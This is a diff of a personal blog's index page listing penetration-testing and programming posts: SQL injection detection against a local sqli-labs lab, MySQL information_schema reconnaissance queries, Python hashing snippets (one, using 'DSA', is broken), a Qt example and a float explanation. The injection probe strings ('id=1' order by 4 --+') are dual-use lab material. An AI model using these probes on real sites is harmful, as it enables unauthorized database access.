+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Penetration-Test/" itemprop="url" rel="index"><span itemprop="name">Penetration Test</span></a>
+                </span>
+                  , 
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Penetration-Test/MySQL/" itemprop="url" rel="index"><span itemprop="name">MySQL</span></a>
+                </span>
+                  , 
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Penetration-Test/MySQL/SQL-Injection/" itemprop="url" rel="index"><span itemprop="name">SQL Injection</span></a>
+                </span>
+                  , 
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Penetration-Test/MySQL/SQL-Injection/Character-based-SQL-Injection/" itemprop="url" rel="index"><span itemprop="name">Character-based SQL Injection</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>Detection of character-based SQL Injection:</p>
+<figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/Less-1/?id=1&#x27;</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-1/?id=1&#x27; order by 4 --+</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2016/10/18/SQLInjectionNumberBased/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Dong Cong">
+      <meta itemprop="description" content="Python、Typescript、Go、C/C++、asm、Bash">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="congdong007">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2016/10/18/SQLInjectionNumberBased/" class="post-title-link" itemprop="url">Detection of Numeric-based SQL Injection</a>
         </h2>
 
         <div class="post-meta">
@@ -522,558 +1101,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2011/01/16/pythonHash/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="Dong Cong">
-      <meta itemprop="description" content="Python、Typescript、Go、C/C++、asm、Bash">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="congdong007">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2011/01/16/pythonHash/" class="post-title-link" itemprop="url">Compilation of Python Code Snippets for Hashing</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2011-01-16 10:47:24" itemprop="dateCreated datePublished" datetime="2011-01-16T10:47:24-05:00">2011-01-16</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2023-10-17 12:06:28" itemprop="dateModified" datetime="2023-10-17T12:06:28-04:00">2023-10-17</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Penetration-Test/" itemprop="url" rel="index"><span itemprop="name">Penetration Test</span></a>
-                </span>
-                  , 
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Penetration-Test/hash/" itemprop="url" rel="index"><span itemprop="name">hash</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>Performing relevant hashing operations is an essential skill in penetration testing. Here is a compilation of code snippets for common hash implementations in Python.</p>
-<p><strong><em>md5</em></strong> :</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line"></span><br><span class="line">mystring = input(<span class="string">&#x27;Enter String to hash: &#x27;</span>)</span><br><span class="line"><span class="comment"># Assumes the default UTF-8</span></span><br><span class="line">hash_object = hashlib.md5(mystring.encode())</span><br><span class="line"><span class="built_in">print</span>(hash_object.hexdigest())</span><br></pre></td></tr></table></figure>
-
-<p><strong><em>sha1</em></strong>:</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line"></span><br><span class="line">hash_object = hashlib.sha1(b<span class="string">&#x27;Hello World&#x27;</span>)</span><br><span class="line">hex_dig = hash_object.hexdigest()</span><br><span class="line"><span class="built_in">print</span>(hex_dig)</span><br></pre></td></tr></table></figure>
-
-
-<p><strong><em>SHA256</em></strong>:</p>
-<figure class="highlight plaintext"><figcaption><span>hashlib</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">hash_object = hashlib.sha256(b&#x27;Hello World&#x27;)</span><br><span class="line">hex_dig = hash_object.hexdigest()</span><br><span class="line">print(hex_dig)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p><strong><em>sha512</em></strong>:</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line"></span><br><span class="line">input = <span class="string">&#x27;test&#x27;</span></span><br><span class="line"><span class="built_in">hash</span> = hashlib.sha512( str( input ).encode(<span class="string">&quot;utf-8&quot;</span>) ).hexdigest()</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hash</span>)</span><br></pre></td></tr></table></figure>
-<p><strong><em>DSA</em></strong>:</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line"></span><br><span class="line">hash_object = hashlib.new(<span class="string">&#x27;DSA&#x27;</span>)</span><br><span class="line">hash_object.update(b<span class="string">&#x27;Hello World&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(hash_object.hexdigest())</span><br></pre></td></tr></table></figure>
-
-
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2010/10/15/information-schema/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="Dong Cong">
-      <meta itemprop="description" content="Python、Typescript、Go、C/C++、asm、Bash">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="congdong007">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2010/10/15/information-schema/" class="post-title-link" itemprop="url">About information_schema in MySQL</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2010-10-15 12:47:16" itemprop="dateCreated datePublished" datetime="2010-10-15T12:47:16-04:00">2010-10-15</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2023-10-18 18:55:07" itemprop="dateModified" datetime="2023-10-18T18:55:07-04:00">2023-10-18</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Penetration-Test/" itemprop="url" rel="index"><span itemprop="name">Penetration Test</span></a>
-                </span>
-                  , 
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Penetration-Test/MySQL/" itemprop="url" rel="index"><span itemprop="name">MySQL</span></a>
-                </span>
-                  , 
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Penetration-Test/MySQL/About-information-schema/" itemprop="url" rel="index"><span itemprop="name">About information_schema</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>The “<strong><em>information_schema</em></strong>“ is a system database in MySQL that contains metadata information about <strong><em>databases, tables, columns, indexes, users, permissions,</em></strong> and more within the MySQL server. It serves as an interface for querying metadata information in MySQL. This information is stored in tabular form within tables in the “information_schema” database, and users can retrieve metadata information by using SQL statements to query these tables.</p>
-<p>Here are some common tables in the ‘information_schema’ database:</p>
-<ol>
-<li><strong><em>SCHEMATA</em></strong>: Stores information about all databases, including database names, character sets, etc.</li>
-<li><strong><em>TABLES</em></strong>: Stores information about all tables, including table names, table types, engines, etc.</li>
-<li><strong><em>COLUMNS</em></strong>: Stores information about all columns, including column names, column data types, column constraints, etc.</li>
-<li><strong><em>STATISTICS</em></strong>: Stores information about all indexes, including index names, index types, the table where the index is located, index columns, etc.</li>
-<li><strong><em>USER_PRIVILEGES</em></strong>: Stores information about user privileges, including user accounts, permissions, etc.</li>
-</ol>
-<p>By querying the tables in the <strong><em>information_schema</em></strong> database, you can obtain information about various aspects of <strong><em>databases, tables, columns, indexes, users, and permissions</em></strong>. This is very helpful for database management and maintenance.</p>
-<p>Next, let’s take a look at an example of finding key information through the information_schema database:</p>
-<ol>
-<li>Query information about the current user:<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT current_user();</span><br></pre></td></tr></table></figure></li>
-<li>Query information about the user for the current session:<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT session_user();</span><br></pre></td></tr></table></figure></li>
-<li>Get the path of the database:<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT @@datadir;</span><br></pre></td></tr></table></figure></li>
-<li>Get the installation path of MySQL:<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select @@basedir;</span><br></pre></td></tr></table></figure></li>
-<li>Retrieve information about the operating system version:<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT @@version_compile_os;</span><br></pre></td></tr></table></figure></li>
-</ol>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2010/05/01/QtSetData/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="Dong Cong">
-      <meta itemprop="description" content="Python、Typescript、Go、C/C++、asm、Bash">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="congdong007">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2010/05/01/QtSetData/" class="post-title-link" itemprop="url">In Qt, how to transmit custom data using QAction::setData</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2010-05-01 23:16:09" itemprop="dateCreated datePublished" datetime="2010-05-01T23:16:09-04:00">2010-05-01</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2023-10-17 12:04:32" itemprop="dateModified" datetime="2023-10-17T12:04:32-04:00">2023-10-17</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/C-C/" itemprop="url" rel="index"><span itemprop="name">C/C++</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>Recently, in a project, there was a need to transmit custom data using QAction::setData. I’ve searched online for a lot of information, but it’s all a bit vague, and none of them hit the mark. Some even provide solutions that completely contradict Qt’s principles. Below is an example code I wrote:</p>
-<ol>
-<li>Custom data:<br>Here, taking a custom class as an example, the code is as follows:</li>
-</ol>
-<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//.h</span></span><br><span class="line"></span><br><span class="line">#ifndef QNEWITEM_H</span><br><span class="line">#define QNEWITEM_H</span><br><span class="line"></span><br><span class="line">#include &lt;QObject&gt;</span><br><span class="line"></span><br><span class="line">class QNewItem : public QObject</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">public:</span><br><span class="line">    QNewItem(QObject *parent = <span class="number">0</span>);</span><br><span class="line">    ~QNewItem();</span><br><span class="line"></span><br><span class="line">    <span class="type">bool</span> setUserInfo(QString&amp; strName,qint16&amp; nAge);</span><br><span class="line"></span><br><span class="line">private:</span><br><span class="line">    QString m_strName;</span><br><span class="line">    qint16 m_nAge;</span><br><span class="line">&#125;;</span><br><span class="line">#endif <span class="comment">// QNEWITEM_H</span></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//.cpp</span></span><br><span class="line"></span><br><span class="line">#include <span class="string">&quot;qnewitem.h&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">QNewItem::QNewItem(QObject *parent)</span><br><span class="line">: QObject(parent)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">QNewItem::~QNewItem()</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> QNewItem::setUserInfo( QString&amp; strName,qint16&amp; nAge )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">bool</span> bRet = <span class="literal">false</span>;</span><br><span class="line">    do</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>( strName.isEmpty() || nAge &gt;<span class="number">200</span> &amp;&amp; nAge&lt;<span class="number">0</span> ) <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        m_strName = strName;</span><br><span class="line">        m_nAge = nAge;</span><br><span class="line">        bRet = <span class="literal">true</span>;</span><br><span class="line">    &#125; while (<span class="literal">false</span>);</span><br><span class="line">    <span class="keyword">return</span> bRet;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<ol start="2">
-<li>At the beginning of the calling CPP file, you must declare it like this:</li>
-</ol>
-<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#include <span class="string">&quot;qnewitem.h&quot;</span></span><br><span class="line"></span><br><span class="line">Q_DECLARE_METATYPE(QNewItem*)</span><br></pre></td></tr></table></figure>
-<p>There’s not much else to say; when you look at the code, you’ll understand everything.</p>
-<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">#include <span class="string">&quot;qnewitem.h&quot;</span></span><br><span class="line"></span><br><span class="line">Q_DECLARE_METATYPE(QNewItem*)</span><br><span class="line"></span><br><span class="line">customDefineDemo::customDefineDemo(QWidget *parent, Qt::WFlags flags)</span><br><span class="line">: QMainWindow(parent, flags)</span><br><span class="line">&#123;</span><br><span class="line">    ui.setupUi(this);</span><br><span class="line">    connect(ui.pushButton , SIGNAL(clicked()),this,SLOT(onBtnClick()));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">customDefineDemo::~customDefineDemo()</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void customDefineDemo::onBtnClick()</span><br><span class="line">&#123;</span><br><span class="line">    QMenu* pMenu = <span class="built_in">new</span> QMenu();</span><br><span class="line">    QNewItem* pNewItem = <span class="built_in">new</span> QNewItem();</span><br><span class="line">    qint16 nAge = <span class="number">34</span>;</span><br><span class="line">    QVariant qv;</span><br><span class="line">    do</span><br><span class="line">    &#123;</span><br><span class="line">        QAction* pPortraitView = <span class="built_in">new</span> QAction(tr(<span class="string">&quot;New&quot;</span>), this);</span><br><span class="line">        QAction* pAddGroup = <span class="built_in">new</span> QAction(tr(<span class="string">&quot;Open&quot;</span>), this);</span><br><span class="line">        QAction* pDeleteGroup = <span class="built_in">new</span> QAction(tr(<span class="string">&quot;Save&quot;</span>), this);</span><br><span class="line"></span><br><span class="line">        pNewItem-&gt;setUserInfo(tr(<span class="string">&quot;Eric&quot;</span>),nAge);</span><br><span class="line"></span><br><span class="line">        pPortraitView-&gt;setData( QVariant::fromValue(pNewItem) ) ;</span><br><span class="line"></span><br><span class="line">        connect(pPortraitView,SIGNAL(triggered()),this,SLOT(triggeredMenuSendMsgContact()));</span><br><span class="line"></span><br><span class="line">        pMenu-&gt;addAction(pPortraitView);</span><br><span class="line">        pMenu-&gt;addAction(pAddGroup);</span><br><span class="line">        pMenu-&gt;addAction(pDeleteGroup);</span><br><span class="line">        pMenu-&gt;exec(QCursor::pos());</span><br><span class="line">    &#125; while (<span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( pMenu != nullptr )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">delete</span> pMenu;</span><br><span class="line">        pMenu = nullptr;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void customDefineDemo::triggeredMenuSendMsgContact()</span><br><span class="line">&#123;</span><br><span class="line">    QAction* pSendMsg= NULL;</span><br><span class="line">    QNewItem* pObj = NULL;</span><br><span class="line">    do</span><br><span class="line">    &#123;</span><br><span class="line">        pSendMsg=qobject_cast&lt;QAction*&gt;(sender());</span><br><span class="line"></span><br><span class="line">        pObj = pSendMsg-&gt;data().value&lt;QNewItem*&gt;();</span><br><span class="line">    &#125; while (<span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( pObj != nullptr )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">delete</span> pObj;</span><br><span class="line">        pObj = nullptr;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2010/03/14/floatData/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="Dong Cong">
-      <meta itemprop="description" content="Python、Typescript、Go、C/C++、asm、Bash">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="congdong007">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2010/03/14/floatData/" class="post-title-link" itemprop="url">The confusing floating point problem</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2010-03-14 22:44:22" itemprop="dateCreated datePublished" datetime="2010-03-14T22:44:22-04:00">2010-03-14</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2023-10-16 23:44:56" itemprop="dateModified" datetime="2023-10-16T23:44:56-04:00">2023-10-16</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Others/" itemprop="url" rel="index"><span itemprop="name">Others</span></a>
-                </span>
-                  , 
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Others/float-data/" itemprop="url" rel="index"><span itemprop="name">float data</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>Recently, I encountered an issue with floating-point numbers. </p>
-<p>code:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fld dword ptr ds:[esi+1E4]</span><br></pre></td></tr></table></figure>
-<p>and </p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">esi+1E4 = 02FCE9D4</span><br></pre></td></tr></table></figure>
-
-<p>The following is its memory:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">02FCE9D4  00 C0 2B 45 00 C0 2B 45 00 00 00 00 00 00 00 00  .?E.?E........</span><br></pre></td></tr></table></figure>
-
-<p>After execution this code:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fld dword ptr ds:[esi+1E4]</span><br></pre></td></tr></table></figure>
-<p>watches:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ST0 = 2748.00000000000.</span><br></pre></td></tr></table></figure>
-
-<p>I would like to know how ST0 equals 2748?</p>
-<p>In the end, it’s all about the representation of floating-point numbers. According to the IEEE standard, the first bit is the sign bit, the next 8 bits represent the exponent, and the remaining 23 bits are the mantissa. Considering that it’s <strong><em>little-endian storage</em></strong>, the value of the number <strong><em>00 C0 2B 45</em></strong> is <strong><em>452BC000</em></strong>, which is:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0100 0101 0010 1011 1100 0000 0000 0000</span><br></pre></td></tr></table></figure>
-
-<p>The first bit is 0, indicating it’s a positive number.<br>The next 8 bits, which is <strong><em>10001010</em></strong>, 8A, in decimal, is 138. 138 - 127 &#x3D; 11, indicating the exponent is <strong><em>11</em></strong> bits.<br>And the remaining 23 bits have the value:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">010 1011 1100 0000 0000 0000</span><br></pre></td></tr></table></figure>
-
-<p>The leading bit, with the omitted <strong><em>1</em></strong>, has a value of:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1010 1011 1100 0000 0000 0000</span><br></pre></td></tr></table></figure>
-
-<p>Above 11 bits for the exponent indicate that the position of the decimal point is:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1010 1011 1100 .  0000 0000 0000</span><br></pre></td></tr></table></figure>
-
-<p>Converting to hexadecimal, it’s <strong><em>ABC</em></strong>.000. Converting to decimal, it’s <strong><em>2748</em></strong>.00000000.</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2009/11/04/codedecompilation/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="Dong Cong">
-      <meta itemprop="description" content="Python、Typescript、Go、C/C++、asm、Bash">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="congdong007">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2009/11/04/codedecompilation/" class="post-title-link" itemprop="url">Example program for code decompilation</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2009-11-04 22:36:35" itemprop="dateCreated datePublished" datetime="2009-11-04T22:36:35-05:00">2009-11-04</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2023-10-16 23:45:59" itemprop="dateModified" datetime="2023-10-16T23:45:59-04:00">2023-10-16</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Asm/" itemprop="url" rel="index"><span itemprop="name">Asm</span></a>
-                </span>
-                  , 
